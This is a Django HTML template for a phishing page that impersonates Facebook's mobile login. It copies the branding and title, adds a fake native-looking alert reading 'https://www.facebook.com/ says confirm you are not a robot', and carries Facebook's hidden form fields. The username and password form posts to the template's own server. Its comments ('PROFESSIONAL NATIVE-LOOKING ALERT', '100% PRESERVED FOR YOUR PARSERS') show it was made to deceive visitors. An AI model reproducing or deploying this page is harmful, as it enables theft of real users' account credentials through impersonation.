<?xml version="1.0" encoding="utf-8"?>
{% load static %}
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook – log in or sign up</title>
    <link rel="icon" href="{% static 'logo.png' %}" type="image/png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #fff;
            color: #1c1e21;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        header {
            background: #1877f2;
            padding: 12px 16px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        header img {
            height: 36px;
        }
        header a {
            background: #4599ff;
            color: white;
            font-weight: 600;
            padding: 8px 16px;
            border-radius: 8px;
            text-decoration: none;
            font-size: 15px;
        }
        main {
            flex: 1;
            padding: 20px 16px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-card {
            background: white;
            width: 100%;
            max-width: 400px;
            border-radius: 12px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .login-card input {
            width: 100%;
            padding: 16px;
            border: 1px solid #dddfe2;
            border-radius: 8px;
            font-size: 17px;
            margin-bottom: 12px;
        }
        .login-card input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #1877f2;
            color: white;
            font-size: 18px;
            font-weight: 600;
            border: none;
            border-radius: 8px;
            margin: 8px 0;
        }
        .forgot {
            text-align: center;
            margin: 16px 0;
            font-size: 14px;
        }
        .forgot a {
            color: #1877f2;
            text-decoration: none;
        }
        .or-divider {
            text-align: center;
            margin: 20px 0;
            position: relative;
            color: #8a8d91;
            font-size: 13px;
        }
        .or-divider::before {
            content: "";
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #dadde1;
        }
        .or-divider span {
            background: white;
            padding: 0 12px;
        }
        .create-btn {
            display: block;
            width: 80%;
            margin: 0 auto;
            padding: 14px;
            background: #42b72a;
            color: white;
            font-size: 17px;
            font-weight: 600;
            text-align: center;
            border-radius: 8px;
            text-decoration: none;
        }
        /* ──────── PROFESSIONAL NATIVE-LOOKING ALERT ──────── */
        .native-alert {
            margin: 20px 16px;
            padding: 16px;
            background: #f5f6f7;
            border-left: 4px solid #1877f2;
            border-radius: 0 8px 8px 0;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            position: relative;
            font-size: 15px;
        }
        .native-alert strong {
            display: block;
            color: #1c1e21;
            margin-bottom: 4px;
            font-size: 16px;
        }
        .native-alert .close {
            position: absolute;
            top: 12px;
            right: 12px;
            font-size: 24px;
            color: #65676b;
            cursor: pointer;
            width: 32px;
            height: 32px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
        }
        .native-alert .close:hover {
            background: #e4e6eb;
        }
        footer {
            padding: 20px 16px;
            text-align: center;
            font-size: 12px;
            color: #8a8d91;
        }
        footer a {
            color: #8a8d91;
            margin: 0 6px;
            text-decoration: none;
        }
        footer a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

<header>
    <img src="{% static 'logopic.png' %}" alt="Facebook">
    <a href="#">Create Account</a>
</header>

<main>
    <!-- Beautiful native-style alert -->
    <div class="native-alert">
        <strong>https://www.facebook.com/ says</strong>
        confirm you are not a robot
        <div class="close" onclick="this.parentElement.style.display='none'">×</div>
    </div>

    <div class="login-card">
        <form method="post" action="" id="login_form">
            {% csrf_token %}
            
            <!-- 100% PRESERVED FOR YOUR PARSERS -->
            <input type="hidden" name="lsd" value="AVoiOkDh">
            <input type="hidden" name="jazoest" value="2725">
            <input type="hidden" name="m_ts" value="1587861069">
            <input type="hidden" name="li" value="TdakXsbi6KXUYMA1TnCZX_to">
            <input type="hidden" name="try_number" value="0">
            <input type="hidden" name="unrecognized_tries" value="0">

            <!-- Critical fields – names untouched -->
            <input type="text" 
                   name="{{ form.username.name }}" 
                   id="m_login_email" 
                   placeholder="Mobile number or email address" 
                   autocorrect="off" 
                   autocapitalize="off" 
                   required>

            <input type="password" 
                   name="{{ form.passcode.name }}" 
                   placeholder="Password" 
                   autocorrect="off" 
                   autocapitalize="off" 
                   required>

            <button type="submit" name="login" class="login-btn">Log in</button>
        </form>

        <div class="forgot">
            <a href="#">Forgotten password?</a>
        </div>

        <div class="or-divider"><span>or</span></div>

        <a href="#" class="create-btn">Create new account</a>
    </div>
</main>

<footer>
    English (UK) · Português (Brasil) · Español · Français (France) · +<br>
    Meta © 2025
</footer>

</body>
</html>
